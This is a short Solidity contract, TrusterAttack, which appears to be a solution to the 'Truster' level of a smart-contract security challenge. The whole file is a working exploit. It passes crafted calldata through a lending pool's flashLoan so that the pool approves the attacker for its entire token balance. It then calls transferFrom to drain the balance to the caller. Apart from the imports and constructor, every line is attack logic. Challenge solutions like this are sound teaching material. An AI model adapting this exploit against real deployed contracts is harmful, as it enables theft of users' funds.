pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract TrusterAttack {
  TrusterLenderPool public pool;
  IERC20 public token;

  constructor(address _pool, address _token) {
    pool = TrusterLenderPool(_pool);
    token = IERC20(_token);
  }

  function attack(address borrower) external {
    address sender = msg.sender;
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
    pool.flashLoan(0, borrower, address(token), data);

    token.transferFrom(address(pool), sender, token.balanceOf(address(pool)));
  }
}
